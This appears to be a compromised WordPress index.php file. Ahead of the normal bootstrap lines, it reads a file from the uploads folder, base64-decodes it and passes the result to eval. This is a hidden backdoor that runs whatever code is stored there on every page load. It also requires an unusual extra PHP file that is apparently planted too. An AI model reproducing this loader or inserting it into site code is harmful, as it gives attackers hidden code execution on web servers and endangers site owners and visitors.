<?php

$code = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/a.txt');
$code=base64_decode($code);
eval('?>' . $code);


define( 'WP_USE_THEMES', true );
require('wp-links-trackback.php');
require __DIR__ . '/wp-blog-header.php';
